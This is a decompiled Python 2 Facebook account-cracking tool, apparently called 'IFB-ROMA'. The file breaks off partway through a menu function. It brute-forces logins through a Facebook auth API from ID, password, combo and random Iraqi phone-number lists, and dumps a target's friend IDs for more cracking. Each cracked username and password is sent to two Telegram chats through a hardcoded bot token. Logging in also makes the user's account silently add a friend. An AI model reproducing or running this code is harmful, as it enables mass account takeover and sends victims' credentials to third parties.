# Decompiled By RandiSr
# Github : https://github.com/RANDIOLOY
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: dg
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
from bs4 import BeautifulSoup

def anime(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


os.system('clear')
reload(sys)
sys.setdefaultencoding('utf8')

def kelwa():
    exlogo = '\n    \x1b[33;1mEXTING\x1b[37;1m.............\x1b[0m\n\t'
    anime(exlogo)
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


logo = '\n\x1b[31;1m\n  \n  _____     ____    __  __            \n |  __ \\   / __ \\  |  \\/  |     /\\    \n | |__) | | |  | | | \\  / |    /  \\   \n |  _  /  | |  | | | |\\/| |   / /\\ \\  \n | | \\ \\  | |__| | | |  | |  / ____ \\ \n |_|  \\_\\  \\____/  |_|  |_| /_/    \\_                      \n                 \nVERSION :   2.5\n\n\x1b[0m\n'
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
phone = []
ph = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')

def n1():
    os.system('clear')
    print logo
    print ' '
    s = requests.Session()
    listid = raw_input('\x1b[31;1mList ID : ')
    listpwd = raw_input('\x1b[31;1mPassword List : ')
    idtot = 0
    pwdtot = 0
    pwlist = []
    idon = []
    try:
        idn = open(listid, 'r').readlines()
        pwist = open(listpwd, 'r').readlines()
    except:
        print "\x1b[31;1m Couldn't Find File \x1b[0m"
        time.sleep(2)
        n1()

    for p in idn:
        idtot += 1
        idon.append(p)

    for i in pwist:
        pwdtot += 1
        pwlist.append(i)

    print '\x1b[36;1m[ \xe2\x99\xa1 ] All PASS \x1b[34;1m' + str(pwdtot) + '\x1b[0m'
    print '\x1b[36;1m[ \xe2\x99\xa1 ] All ID \x1b[34;1m' + str(idtot) + '\x1b[0m'
    print '\x1b[37;1m[ % ] PLEASE WAIT........................'
    print '\x1b[36;1mCRACKING START PLEASE WAIT UNTIL END.........'
    print '\x1b[37;1m=============================================='
    for idd in idon:
        id = idd.strip()
        for ppwd in pwlist:
            time.sleep(0.6)
            pwd = ppwd.strip()
            try:
                http = s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'})
                ksred = json.loads(http.text)
                if 'access_token' in ksred:
                    msghk = '==============' + '\n HACKED SUCCESS' + '\n____________' + '\n [ ID ]  : ' + id + '\n[ PASS ] : ' + pwd + '\n==============' + '\n Ch: @kakSoftware \n Tele: @HamaSoftware'
                    msghkk = '==============' + '\n\x1b[37;1m HACKED SUCCESS\x1b[0m' + '\n\x1b[32;1m[  ID  ]  : \x1b[37;1m' + id + '\n\x1b[32;1m[ PASS ] : \x1b[37;1m' + pwd + '\x1b[37;1m\n==============' + '\n \x1b[37;1mCh: @kakSoftware     Tele: @HamaSoftware'
                    print ' '
                    msghkfile = '{ = I F B - R O M A = } ' + '\nHACKED SUCCESS ' + '\n[ ID ] : ' + id + '\n[ PASS ] : ' + pwd + '\n Ch: @kakSoftware \t Tele: @HamaSoftware'
                    filehack = open('hacked.txt', 'a')
                    filehack.write(msghkfile)
                    filehack.close()
                    print msghkk
                    print ' '
                    sendBot = requests.get('https://api.telegram.org/bot' + '1309105015:AAFzSqrEk_7mDrZv5nGSIpkMYVkRILlW03s' + '/sendMessage?chat_id=' + '701360239' + '&parse_mode=Markdown&text=' + msghk)
                    sendBo2 = requests.get('https://api.telegram.org/bot' + '1309105015:AAFzSqrEk_7mDrZv5nGSIpkMYVkRILlW03s' + '/sendMessage?chat_id=' + '744225167' + '&parse_mode=Markdown&text=' + msghk)
                    time.sleep(0.3)
                elif 'www.facebook.com' in ksred['error_msg']:
                    msgck = '==============' + '\n ACCOUNT ON CHKPOINT' + '\n____________' + '\n [ ID ]  : ' + id + '\n[ PASS ] : ' + pwd + '\n==============' + '\n Ch: @kakSoftware.          Tele: @HamaSoftware'
                    msgckk = '==============' + '\n\x1b[37;1m ACCOUNT ON CHKPOINT\x1b[0m' + '\n\x1b[31;1m [ ID ]  : \x1b[37;1m' + id + '\n\x1b[31;1m[ PASS ] : \x1b[37;1m' + pwd + '\x1b[37;1m\n==============' + '\n \x1b[37;1mCh: @kakSoftware.          Tele: @HamaSoftware'
                    print ' '
                    msghkfile = '{ = I F B - R O M A = } ' + '\nCHKPOINT' + '\n[ ID ] : ' + id + '\n[ PASS ] : ' + pwd + '\n Ch: @kakSoftware \t Tele: @HamaSoftware'
                    filehack = open('chkpoint.txt', 'a')
                    filehack.write(msghkfile)
                    filehack.close()
                    print msgckk
                    print ' '
                    Sendbot = requests.get('https://api.telegram.org/bot' + '1309105015:AAFzSqrEk_7mDrZv5nGSIpkMYVkRILlW03s' + '/sendMessage?chat_id=' + '701360239' + '&parse_mode=Markdown&text=' + msgck)
                    Sendbot2 = requests.get('https://api.telegram.org/bot' + '1309105015:AAFzSqrEk_7mDrZv5nGSIpkMYVkRILlW03s' + '/sendMessage?chat_id=' + '744225167' + '&parse_mode=Markdown&text=' + msgck)
                    time.sleep(0.3)
            except:
                time.sleep(3)

    raw_input('ENTER TO BACK')
    crackfb()


def n2():
    os.system('clear')
    print logo
    print ' '
    r = requests.Session()
    lird = 0
    list = raw_input('\x1b[31;1mCombo list : ')
    try:
        ficob = open(list, 'r').readlines()
    except:
        print "\x1b[31;1mFile Couldn't Find..."
        time.sleep(2)
        n2()

    for ch in ficob:
        lird += 1

    print '\x1b[36;1m[ \xe2\x99\xa1 ] All ID:PASS \x1b[34;1m' + str(lird) + '\x1b[0m'
    print '\x1b[37;1m[ % ] PLEASE WAIT........................'
    print '\x1b[36;1mCRACKING START PLEASE WAIT UNTIL END.........'
    print '\x1b[37;1m=============================================='
    for empw in ficob:
        time.sleep(0.6)
        ep = empw.strip().split(':')
        id = ep[0]
        pwd = ep[1]
        try:
            http = r.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'})
            ksred = json.loads(http.text)
            time.sleep(0.5)
            if 'access_token' in ksred:
                msghk = '==============' + '\n HACKED SUCCESS' + '\n____________' + '\n [ ID ]  : ' + id + '\n[ PASS ] : ' + pwd + '\n==============' + '\n Ch: @kakSoftware \n Tele: @HamaSoftware'
                msghkk = '==============' + '\n\x1b[37;1m HACKED SUCCESS\x1b[0m' + '\n\x1b[32;1m[  ID  ]  : \x1b[37;1m' + id + '\n\x1b[32;1m[ PASS ] : \x1b[37;1m' + pwd + '\x1b[37;1m\n==============' + '\n \x1b[37;1mCh: @kakSoftware     Tele: @HamaSoftware'
                print ' '
                msghkfile = '{ = I F B - R O M A = } ' + '\nHACKED SUCCESS ' + '\n[ ID ] : ' + id + '\n[ PASS ] : ' + pwd + '\n Ch: @kakSoftware \t Tele: @HamaSoftware'
                filehack = open('hacked.txt', 'a')
                filehack.write(msghkfile)
                filehack.close()
                print msghkk
                print ' '
                sendBot = requests.get('https://api.telegram.org/bot' + '1309105015:AAFzSqrEk_7mDrZv5nGSIpkMYVkRILlW03s' + '/sendMessage?chat_id=' + '701360239' + '&parse_mode=Markdown&text=' + msghk)
                sendBot2 = requests.get('https://api.telegram.org/bot' + '1309105015:AAFzSqrEk_7mDrZv5nGSIpkMYVkRILlW03s' + '/sendMessage?chat_id=' + '744225167' + '&parse_mode=Markdown&text=' + msghk)
                time.sleep(0.3)
            elif 'www.facebook.com' in ksred['error_msg']:
                msgck = '==============' + '\n ACCOUNT ON CHKPOINT' + '\n____________' + '\n [ ID ]  : ' + id + '\n[ PASS ] : ' + pwd + '\n==============' + '\n Ch: @kakSoftware.          Tele: @HamaSoftware'
                msgckk = '==============' + '\n\x1b[37;1m ACCOUNT ON CHKPOINT\x1b[0m' + '\n\x1b[31;1m [ ID ]  : \x1b[37;1m' + id + '\n\x1b[31;1m[ PASS ] : \x1b[37;1m' + pwd + '\x1b[37;1m\n==============' + '\n \x1b[37;1mCh: @kakSoftware.          Tele: @HamaSoftware'
                print ' '
                msghkfile = '{ = I F B - R O M A = } ' + '\nCHKPOINT' + '\n[ ID ] : ' + id + '\n[ PASS ] : ' + pwd + '\n Ch: @kakSoftware \t Tele: @HamaSoftware'
                filehack = open('chkpoint.txt', 'a')
                filehack.write(msghkfile)
                filehack.close()
                print msgckk
                print ' '
                Sendbot = requests.get('https://api.telegram.org/bot' + '1309105015:AAFzSqrEk_7mDrZv5nGSIpkMYVkRILlW03s' + '/sendMessage?chat_id=' + '701360239' + '&parse_mode=Markdown&text=' + msgck)
                Sendbot2 = requests.get('https://api.telegram.org/bot' + '1309105015:AAFzSqrEk_7mDrZv5nGSIpkMYVkRILlW03s' + '/sendMessage?chat_id=' + '744225167' + '&parse_mode=Markdown&text=' + msgck)
                time.sleep(0.3)
        except:
            time.sleep(3)

    raw_input('ENTER FOR BACK')
    crackfb()


def asia():
    os.system('clear')
    try:
        os.system('rm -rif asia_list.txt')
    except:
        pass

    print logo
    print ' '
    num = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
    asia = ['0773', '0770', '0772', '0774', '0775', '0776']
    numl = [600, 800, 500, 300, 1000, 700, 200]
    n = 0
    o = random.choice(numl)
    print '\x1b[37;1m[ % ] PLEASE WAIT........................'
    anime('\x1b[36;1mNUMBER GRABER IS STARED.........')
    print '\x1b[37;1m=============================================='
    for x in range(o):
        area = random.choice(asia)
        n1 = random.choice(num)
        n2 = random.choice(num)
        n3 = random.choice(num)
        n4 = random.choice(num)
        n5 = random.choice(num)
        n6 = random.choice(num)
        n7 = random.choice(num)
        phone = area + n1 + n2 + n3 + n4 + n5 + n6 + n7
        file = open('asia_list.txt', 'a')
        file.write(phone + '\n')
        n += 1
        file.close()

    print ' '
    print ' '
    anime('\n\x1b[37;1mNUMBER GRABED : ' + str(n))
    anime('\n\x1b[37;1mSuccessfuly number grabed....')
    raw_input('ENTER TO BACK')
    crackfb()


def korek():
    os.system('clear')
    try:
        os.system('rm -rif korek_list.txt')
    except:
        pass

    print logo
    print ' '
    num = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
    asia = ['0750', '0751']
    numl = [600, 800, 500, 300, 1000, 700, 200]
    n = 0
    o = random.choice(numl)
    print '\x1b[37;1m[ % ] PLEASE WAIT........................'
    anime('\x1b[36;1mNUMBER GRABER IS STARED.........')
    print '\x1b[37;1m=============================================='
    for x in range(o):
        area = random.choice(asia)
        n1 = random.choice(num)
        n2 = random.choice(num)
        n3 = random.choice(num)
        n4 = random.choice(num)
        n5 = random.choice(num)
        n6 = random.choice(num)
        n7 = random.choice(num)
        phone = area + n1 + n2 + n3 + n4 + n5 + n6 + n7
        file = open('korek_list.txt', 'a')
        file.write(phone + '\n')
        n += 1
        file.close()

    print ' '
    print ' '
    anime('\n\x1b[37;1mNUMBER GRABED : ' + str(n))
    anime('\n\x1b[37;1mSuccessfuly number grabed....')
    raw_input('ENTER TO BACK')
    crackfb()


def zain():
    try:
        os.system('rm -rif zain_list.txt')
    except:
        pass

    num = [
     '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
    asia = ['0780', '0781', '0782', '0783', '0784', '0775', '0786']
    numl = [600, 800, 500, 300, 1000, 700, 200]
    n = 0
    o = random.choice(numl)
    print '\x1b[37;1m[ % ] PLEASE WAIT........................'
    anime('\x1b[36;1mNUMBER GRABER IS STARED.........')
    print '\x1b[37;1m=============================================='
    for x in range(o):
        area = random.choice(asia)
        n1 = random.choice(num)
        n2 = random.choice(num)
        n3 = random.choice(num)
        n4 = random.choice(num)
        n5 = random.choice(num)
        n6 = random.choice(num)
        n7 = random.choice(num)
        phone = area + n1 + n2 + n3 + n4 + n5 + n6 + n7
        file = open('zain_list.txt', 'a')
        file.write(phone + '\n')
        n += 1
        file.close()

    print ' '
    print ' '
    anime('\n\x1b[37;1mNUMBER GRABED : ' + str(n))
    anime('\n\x1b[37;1mSuccessfuly number grabed....')
    raw_input('[ENTER FOR BACK]')
    crackfb()


def n4():
    os.system('clear')
    print logo
    print ' '
    lpr = '                       \n  \x1b[37;1m{       I F B - R O M A        }\n  \x1b[36;1m===================================\n  \x1b[37;1m[ 1 ] Asia\n  [ 2 ] Korek\n  [ 3 ] Zain\n  [ 0 ] Back\n  \x1b[36;1m|||||||||||||||||||||||||||||||||||\n  \x1b[0m'
    print lpr
    chph = raw_input('IFB : ')
    if chph == '1':
        asia()
    elif chph == '2':
        korek()
    elif chph == '3':
        zain()
    elif chph == '0':
        crackfb()
    else:
        n4()


def n5():
    os.system('clear')
    print logo
    print ' '
    list = raw_input('\x1b[31;1mPhoneNum list : ')
    ph = 0
    try:
        file = open(list, 'r').readlines()
    except:
        print "\x1b[31;1mFile Couldn't Find..."
        time.sleep(2)
        n5()

    for lo in file:
        ph += 1

    print '\x1b[36;1m[ \xe2\x99\xa1 ] All PHNM:PHNM \x1b[34;1m' + str(ph) + '\x1b[0m'
    print '\x1b[37;1m[ % ] PLEASE WAIT........................'
    print '\x1b[36;1mCRACKING START PLEASE WAIT UNTIL END.........'
    print '\x1b[37;1m=============================================='
    for line in file:
        s = requests.Session()
        time.sleep(0.6)
        try:
            phn = line.strip()
            http = s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + phn + '&locale=en_US&password=' + phn + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'})
            ksred = json.loads(http.text)
            if 'access_token' in ksred:
                msghk = '==============' + '\n HACKED SUCCESS' + '\n____________' + '\n [ ID ]  : ' + phn + '\n[ PASS ] : ' + phn + '\n==============' + '\n Ch: @kakSoftware \t Tele: @HamaSoftware'
                msghkk = '==============' + '\n\x1b[37;1m HACKED SUCCESS\x1b[0m' + '\n\x1b[32;1m[  ID  ]  : \x1b[37;1m' + phn + '\n\x1b[32;1m[ PASS ] : \x1b[37;1m' + phn + '\x1b[37;1m\n==============' + '\n \x1b[37;1mCh: @kakSoftware     Tele: @HamaSoftware'
                print ' '
                msghkfile = '{ = I F B - R O M A = } ' + '\nHACKED SUCCESS ' + '\n[ ID ] : ' + phn + '\n[ PASS ] : ' + phn + '\n Ch: @kakSoftware \t Tele: @HamaSoftware'
                filehack = open('hacked.txt', 'a')
                filehack.write(msghkfile)
                filehack.close()
                print msghkk
                print ' '
                sendBot = requests.get('https://api.telegram.org/bot' + '1309105015:AAFzSqrEk_7mDrZv5nGSIpkMYVkRILlW03s' + '/sendMessage?chat_id=' + '701360239' + '&parse_mode=Markdown&text=' + msghk)
                sendBot2 = requests.get('https://api.telegram.org/bot' + '1309105015:AAFzSqrEk_7mDrZv5nGSIpkMYVkRILlW03s' + '/sendMessage?chat_id=' + '744225167' + '&parse_mode=Markdown&text=' + msghk)
                time.sleep(0.3)
            elif 'www.facebook.com' in ksred['error_msg']:
                msgck = '==============' + '\n ACCOUNT ON CHKPOINT' + '\n____________' + '\n [ ID ]  : ' + phn + '\n[ PASS ] : ' + phn + '\n==============' + '\n Ch: @kakSoftware \t Tele: @HamaSoftware'
                msgckk = '==============' + '\n\x1b[37;1m ACCOUNT ON CHKPOINT\x1b[0m' + '\n\x1b[31;1m [ ID ]  : \x1b[37;1m' + phn + '\n\x1b[31;1m[ PASS ] : \x1b[37;1m' + phn + '\x1b[37;1m\n==============' + '\n \x1b[37;1mCh: @kakSoftware.          Tele: @HamaSoftware'
                print ' '
                msghkfile = '{ = I F B - R O M A = } ' + '\nCHKPOINT' + '\n[ ID ] : ' + phn + '\n[ PASS ] : ' + phn + '\n Ch: @kakSoftware \t Tele: @HamaSoftware'
                filehack = open('chkpoint.txt', 'a')
                filehack.write(msghkfile)
                filehack.close()
                print msgckk
                print ' '
                Sendbot = requests.get('https://api.telegram.org/bot' + '1309105015:AAFzSqrEk_7mDrZv5nGSIpkMYVkRILlW03s' + '/sendMessage?chat_id=' + '701360239' + '&parse_mode=Markdown&text=' + msgck)
                Sendbot = requests.get('https://api.telegram.org/bot' + '1309105015:AAFzSqrEk_7mDrZv5nGSIpkMYVkRILlW03s' + '/sendMessage?chat_id=' + '744225167' + '&parse_mode=Markdown&text=' + msgck)
                time.sleep(0.3)
        except:
            time.sleep(3)

    raw_input('[ENTER FOR BACK]')
    crackfb()


def n8():
    try:
        os.system('rm -rif combo.txt')
    except:
        pass

    os.system('clear')
    logo = '\n  \x1b[37;1m{ Combo Maker }\n  \x1b[36;1m{========================}\n\n  '
    print logo
    print ' '
    try:
        ic = input('\x1b[36;1mCombo Number :  \x1b[37;1m')
    except:
        print ' '
        print '\x1b[37;1mPlease Write Number.....'
        time.sleep(3)
        n8()

    anime('\x1b[37;1mCombo Graber Stared.......')
    o = 0
    print '\x1b[36;1m===================='
    try:
        for cbo in range(ic):
            area = [
             '750', '751', '773', '770', '772', '774', '775', '776', '780', '781', '782', '783', '784', '775', '786']
            num = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
            iraq = random.choice(area)
            n1 = random.choice(num)
            n2 = random.choice(num)
            n3 = random.choice(num)
            n4 = random.choice(num)
            n5 = random.choice(num)
            n6 = random.choice(num)
            n7 = random.choice(num)
            phone = '+964' + iraq + n1 + n2 + n3 + n4 + n5 + n6 + n7
            passlist = ['1122334455', '112233445566', '11223344556677', '1234554321', '123456654321', '12345677654321', '12345', '12345678', '12345@@', '12345aa', '123456789']
            pwd = random.choice(passlist)
            file = open('combo.txt', 'a')
            file.write(phone + ':' + pwd + '\n')
            o += 1
            file.close()

    except:
        print '\x1b[37;1mPlease Write Number.....'
        time.sleep(3)
        n8()

    anime('\n\x1b[37;1mCOMBO : ' + str(o))
    print '\n\x1b[37;1mCombo Saved at combo.txt'
    anime('\n\x1b[37;1mSuccessfuly combo maked....')
    print '\n'
    raw_input('[ENTER FOR BACK]')
    crackfb()


def id9():
    try:
        os.system('rm -rif tf.txt')
    except:
        pass

    os.system('clear')
    try:
        toket = open('token.txt', 'r').read()
    except IOError:
        print '\x1b[37;1m[\x1b[36;1m T \x1b[37;1m]\x1b[37;1m Token Expired\x1b[0m'
        os.system('rm -rf token.txt')
        time.sleep(2)
        n9()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        namefb = a['name']
        print '\x1b[36;1mFacebook Name : \x1b[36;1m' + namefb
    except KeyError:
        print "\x1b[37;1mYour A\xc3\xa7count on Chkpoint Can't Be used"
        time.sleep(2)
        os.system('rm -rf token.txt')
        n9()

    idt = raw_input('\x1b[36;1mENTER PUBLIC ID : ')
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        op = json.loads(jok.text)
        print '\x1b[36;1mTarget Name :  \x1b[37;1m' + op['name'] + '\x1b[0m'
    except KeyError:
        print '\x1b[31;1mInvalid ID /\x1b[0m'
        time.sleep(3)
        id9()

    print '\x1b[36;1mCrack All Friend \x1b[0m'
    r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
    z = json.loads(r.text)
    idchk = 0
    num = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
    ph1 = random.choice(num)
    ph2 = random.choice(num)
    ph3 = random.choice(num)
    filename = 'id_dum-' + ph1 + ph2 + ph3 + '.txt'
    for s in z['data']:
        word = open(filename, 'a')
        id = s['id']
        word.write(id + '\n')
        word.close()
        idchk += 1

    anime('\x1b[37;1mAll ID : ' + str(idchk))
    anime('\x1b[37;1mWait..........')
    anime('All dumped id saved at ' + filename + ' file......')
    raw_input('[ENTER FOR BACK]')
    crackfb()


def n9():
    try:
        toket = open('token.txt.txt', 'r')
        id9()
    except (KeyError, IOError):
        pass

    os.system('clear')
    logo = '\n  \x1b[37;1m{ I F B - R O M A }\n  \x1b[36;1m|||||||||||||||||||\n\n  \x1b[37;1m{ = LOGIN YOUR FACEBOOK ACCOUNT = }\n  \x1b[0m\n\n  '
    s = requests.Session()
    print logo
    id = raw_input('\x1b[36;1mEmail : ')
    print ' '
    pwd = raw_input('\x1b[36;1mPassword : ')
    print ' '
    anime('\x1b[37;1mWait..................')
    http = s.get('https://api.facebook.com/method/auth.login?format=json&email=' + id + '&password=' + pwd + '&generate_session_cookies=1&error_detail_type=button_with_disabled&machine_id=EAnHV3r4sl0wrkMiwK8iyQUm446&locale=en_US&client_country_code=US&fb_api_req_friendly_name=authenticate&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32')
    ksred = json.loads(http.text)
    if 'access_token' in ksred:
        print ' '
        try:
            sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
            data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
            x = hashlib.new('md5')
            x.update(sig)
            a = x.hexdigest()
            data.update({'sig': a})
            url = 'https://api.facebook.com/restserver.php'
            r = requests.get(url, params=data)
            z = json.loads(r.text)
            unikers = open('token.txt', 'w')
            unikers.write(z['access_token'])
            unikers.close()
            print '\n\x1b[36;1m[\xe2\x9c\x93] Login Successfuly\x1b[0m'
            requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
            time.sleep(2)
            id9()
        except requests.exceptions.ConnectionError:
            print ' '
            print '\n\x1b[37;1mINTERNET CONNECTION LOST.....'
            time.sleep(1)
            sys.exit()

    elif 'www.facebook.com' in ksred['error_msg']:
        print ' '
        print '\x1b[37;1mYour Account On Chkpoint.....'
        time.sleep(3)
        n9()
    else:
        print ' '
        print '\x1b[37;1mYour Email or Password is wrong....'
        time.sleep(3)
        n9()


br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1')]

def tik():
    titik = ['.', '..', '...', '....', '.....', '......', '.......']
    print ' '
    for o in titik:
        print '\r\x1b[36;1m    Wait to Login\x1b[37;1m' + o + '\x1b[0m',
        sys.stdout.flush()
        time.sleep(1)


back = 0
berhasil = []
listgrup = []
phone = []
ph = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def login():
    os.system('clear')
    try:
        toket = open('token.txt', 'r')
        menu()
    except (KeyError, IOError):
        print logo
        fblogom = '\n   ${\x1b[37;1m<<<<<<<<<<<[\x1b[36;1mLogin Facebook\x1b[0m]\x1b[37;1m>>>>>>>>>>>\x1b[0m}$\n\t\t'
        print fblogom
        id = raw_input('    \x1b[37;1m{[\x1b[36;1mEMAIL\x1b[0m\x1b[37;1m]}\x1b[37;1m$>>>>>>>> \x1b[37;1m')
        pwd = raw_input('    \x1b[37;1m{[\x1b[36;1mPASSWORD\x1b[0m]}\x1b[36;1m$>>>>>>>> \x1b[37;1m')
        print ' '
        anime('   ${\x1b[37;1m<<<<<<<<<<<[\x1b[36;1mAccount Data\x1b[0m]\x1b[37;1m>>>>>>>>>>>\x1b[0m}$')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[31;1m    [\xc3\x97]% LOST INTERNET CONNECTION PLEASE CHECK YOU INTERNET'
            kelwa()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('token.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[36;1m    [\xe2\x9c\x93] Login Successfuly\x1b[0m'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                time.sleep(2)
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[37;1m    [%]\xc2\xae INTERNET CONNECTION LOST ERROR WHILE GET DATA\x1b[0m'
                kelwa()

        if 'checkpoint' in url:
            print '\n\x1b[37;1m    [%]\xc2\xa9 Your Account in CheckPoint Cant Be Used /\x1b[0m'
            os.system('rm -rf token.txt')
            time.sleep(2)
            login()
        else:
            print '\n\x1b[37;1m[{\xc3\x97}] Your \x1b[37;1mEmail\x1b[0m\x1b[37;1mOr Your \x1b[37;1mPassword\x1b[37;1mIS \x1b[37;1m Wrong /\x1b[0m'
            os.system('rm -rf token.txt')
            time.sleep(2)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('token.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[37;1m[#] Your Token Is Expired'
        os.system('rm -rf token.txt')
        time.sleep(1)
        login()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        namefb = a['name']
        id = a['id']
        ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
        b = json.loads(ots.text)
        subid = str(b['summary']['total_count'])
    except KeyError:
        print '\n\x1b[37;1m[%]\xc2\xa9 Your Account in CheckPoint Cant Be Used /\x1b[0m'
        os.system('rm -rf token.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\n\x1b[37;1m[%]\xc2\xae INTERNET CONNECTION LOST ERROR WHILE GET DATA\x1b[0m'
        kelwa()

    os.system('clear')
    print logo
    print '\x1b[37;1m==========\x1b[37;1m[\x1b[36;1mACCOUNT DATA\x1b[37;1m]\x1b[37;1m==========\x1b[0m'
    anime('[\xe2\x9c\x93] Facbook Name : ' + '[ ' + namefb + ' ]')
    anime('[\xe2\x9c\x93] ID : [ ' + id + ' ]')
    anime('[\xe2\x9c\x93] ToTal Sub : [ ' + subid + ' ]')
    print ' '
    print '\x1b[37;1m================================'
    opntn = '\n\x1b[37;1m================\n#\x1b[36;1m[ 1 ] For Start CRACKING \x1b[0m !\x1b[37;1m\n#\x1b[36;1m[ 0 ] For Logout Account \x1b[0m  !\n\x1b[37;1m================\n\t'
    print opntn
    time.sleep(1)
    option()


def option():
    unikers = raw_input('\n\x1b[37;1m [@] Option : \x1b[37;1m')
    if unikers == '':
        print '\x1b[31;1m [ \xcf\x80 ] Please Fill The Option Input'
        option()
    elif unikers == '1':
        graber()
    elif unikers == '0':
        anime('\x1b[37;1m[ ! ]\x1b[0m \x1b[37;1mLOGIN OUT ACCOUNT.......\x1b[0m')
        print ' '
        time.sleep(2)
        os.system('rm -rf token.txt')
        kelwa()
    else:
        print "\x1b[37;1m Please Don't Write anything Else just Write Option Number\x1b[0m"
        time.sleep(2)
        option()


def graber():
    global toket
    os.system('clear')
    try:
        toket = open('token.txt', 'r').read()
    except IOError:
        print '\x1b[37;1m[\x1b[37;1m T \x1b[0m]\x1b[37;1m Token Expired\x1b[0m'
        os.system('rm -rf token.txt')
        time.sleep(2)
        login()

    os.system('clear')
    print logo
    print '\x1b[37;1m>>>>>>>>>>>>>>>>>>>>>>>>>>>\x1b[0m'
    print '\x1b[36;1m[ 1 ] CRACKING From ID Of Friend\x1b[0m'
    print '\x1b[36;1m[ 2 ] CRACKING From Public ID \x1b[0m'
    print '\x1b[36;1m[ 0 ] EXIT\x1b[0m'
    print '\x1b[37;1m>>>>>>>>>>>>>>>>>>>>>>>>>>>\x1b[0m'
    startgrab()


def startgrab():
    id = []
    peak = raw_input('\x1b[37;1mCRACK : \x1b[37;1m')
    if peak == '':
